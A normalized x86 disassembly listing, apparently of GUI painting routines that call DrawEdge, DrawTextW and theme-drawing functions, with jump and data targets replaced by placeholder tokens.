test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4070fc
test bh 0x4
je r-xdata
mov eax edi
call sub_4612dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_407768
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
mov dl 0x1
call sub_44ce9c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x40 ]
mov eax [ edi + 0x10 ]
movzx eax [ eax + 0x1d ]
mov [ ebp - 0xd ] al
movzx edx [ r-xdata ]
or dl [ ebp - 0xd ]
mov eax edi
call sub_44c590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c5ad
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x1c ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_44df24
push eax
call DrawEdge
jmp r-xdata
cmp [ eax ] 0x26
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov eax [ ebp - 0x8 ]
call sub_44df24
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4074a4
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_40ac74
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx 0xff000014
call sub_44c1c8
mov eax [ ebp - 0x8 ]
call sub_44df24
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0x2 ] 0x0
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push edi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push esi
call DrawTextW
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx 0xff000010
call sub_44c1c8
mov eax 0xff00000d
call sub_44bb2c
mov esi eax
mov eax 0xff000010
call sub_44bb2c
cmp esi eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx 0xff000014
call sub_44c1c8
jmp r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push edi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push esi
call DrawTextW
mov eax [ ebp + 0x10 ]
or ecx 0xffffffff
or edx 0xffffffff
call sub_40ac74
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_45c61c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45c7f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x40
call sub_404c14
mov [ ebp - 0x58 ] 0x40
mov [ ebp - 0x54 ] 0x2001
mov eax ebx
and eax 0x400
cmp eax 0x400
jne r-xdata
mov eax [ esi + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x8 ]
call sub_45f5a8
mov edi eax
test edi edi
je r-xdata
or [ ebp - 0x54 ] 0x200
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4070fc
test bh 0x4
je r-xdata
mov eax edi
call sub_4612dc
test al al
je r-xdata
mov eax [ esi + 0x48 ]
mov dl 0x1
call sub_44ce9c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3a ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl 0x0
jne r-xdata
call sub_485c78
mov dl 0x7
call sub_485d44
mov [ ebp - 0x14 ] eax
mov eax esi
call sub_44df24
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edi [ esi + 0x40 ]
mov eax [ edi + 0x10 ]
movzx eax [ eax + 0x1d ]
mov [ ebp - 0xd ] al
movzx edx [ r-xdata ]
or dl [ ebp - 0xd ]
mov eax edi
call sub_44c590
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ eax ] 0x26
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x39 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ebx
push edi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xe
push esi
mov eax [ ebp - 0x14 ]
push eax
call j_sub_43f966
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c7f8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4074a4
cmp [ eax + 0x2 ] 0x0
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_45c818
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xffffffdc
xor eax eax
push ebp
push sub_45d25e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
push 0x0
push 0x9
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x8 ]
push eax
push 0xedb
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xe
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_44c1c8
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax [ ebp - 0x18 ]
mov edi [ ebp - 0x34 ]
sub eax edi
sub eax edi
call sub_40ab90
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x10 ]
mov ecx edi
add ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax edi
call sub_40ab90
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xedb
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0x8
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_44c1c8
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
setne al
and eax 0x7f
mov edx [ ebp + 0x8 ]
test [ edx + 0xc ] 0x40
setne dl
and edx 0x7f
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax - 0x20 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
cmp eax edx
jle r-xdata
mov eax [ ebp + 0x8 ]
push esi
lea edi [ eax - 0x20 ]
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push 0x0
mov eax [ esi ]
movzx eax [ eax + 0x3d ]
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x38 ]
push eax
push 0x0
push 0xe12
mov eax [ esi ]
movzx eax [ eax + 0x3d ]
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00001e
call sub_44cd1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x18 ]
cmp eax edx
jle r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edx
mov edx [ ebp + 0x8 ]
add [ edx - 0x14 ] eax
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x34 ]
sub [ ebp - 0x48 ] eax
mov eax [ ebp - 0x24 ]
sub [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x38 ]
add [ ebp - 0x40 ] eax
mov eax [ ebp - 0x28 ]
add [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x14 ]
sub ecx [ ebp - 0x4c ]
sar ecx 0x1
jns r-xdata
mov ecx ebx
xor cl 0x1
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x48 ]
push eax
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
sub edx [ ebp - 0x50 ]
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov ecx [ ebp + 0x8 ]
sub eax edx
mov edx [ ebp + 0x8 ]
sub [ edx - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
sub eax edx
mov edx [ ebp + 0x8 ]
add [ edx - 0x18 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x58 ]
call sub_40ac74
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x68 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x1
push 0xe
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
mov edi [ eax + 0x40 ]
cmp edi 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax ebx
xor al 0x1
test al al
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
push 0x2
push 0xe
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4892a4
cmp edi eax
jl r-xdata
mov eax [ esi ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x40 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
sub [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x40 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
add [ eax - 0x10 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ esi ]
mov edi [ eax + 0x4c ]
test edi edi
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov al 0x1
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
je r-xdata
push 0x10
lea eax [ ebp - 0x68 ]
push eax
mov ecx 0x10
xor edx edx
xor eax eax
call sub_40ab90
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
sub ecx edx
sub ecx 0x10
sar ecx 0x1
jns r-xdata
mov eax [ esi ]
mov edi [ eax + 0x40 ]
cmp edi 0xffffffff
jle r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x3
mov edx [ ebp + 0x8 ]
sub [ edx - 0x8 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x3
mov edx [ ebp + 0x8 ]
add [ edx - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
sub [ edx - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x10 ] eax
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax - 0x10 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax - 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x8 ]
add ecx edx
push ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub edx eax
sub edx 0x10
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4892a4
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x48 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp - 0x40 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
push esi
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ esi ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ esi ]
call sub_45c61c
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov ecx [ ebp + 0x8 ]
add edx eax
lea eax [ ebp - 0x68 ]
pop ecx
call sub_40ac74
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x58 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x0
lea eax [ ebp - 0x58 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x3d ]
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
sub ecx edx
mov edi [ ebp + 0x8 ]
mov edi [ edi - 0x2c ]
sub ecx [ edi + 0x34 ]
sar ecx 0x1
jns r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
sub [ eax - 0x4 ] edx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
push 0x0
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call sub_485c78
mov dl 0x7
call sub_485d44
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x3c ]
mov eax [ ebp + 0x8 ]
sub ecx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub ecx eax
sar ecx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov edi [ ebp + 0x8 ]
add ecx edx
push ecx
mov edx [ esi ]
mov edx [ edx + 0x40 ]
push edx
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub ecx eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub ecx [ edx + 0x38 ]
sar ecx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor edx edx
call sub_40ac74
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ esi ]
call sub_45c61c
mov eax [ esi ]
movzx edi [ eax + 0x60 ]
test di di
je r-xdata
adc ecx 0x0
mov eax [ esi ]
mov ecx [ eax + 0x4c ]
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edi [ eax ]
call [ edi + 0x80 ]
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
sub edx eax
sar edx 0x1
jns r-xdata
add [ ebp - 0x68 ] edx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
add eax [ ebp - 0x68 ]
mov [ ebp - 0x60 ] eax
adc edx 0x0
mov edx [ ebp + 0x8 ]
add ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x28 ]
call sub_4899c8
jmp r-xdata
adc ecx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d265
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
add [ ebp - 0x64 ] edx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
add eax [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
adc edx 0x0
mov eax [ esi ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_45b1f0
test bl bl
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx eax
add edx eax
add edx [ ebp - 0x28 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_44cfbc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
sub eax [ ebp - 0x10 ]
sub eax [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
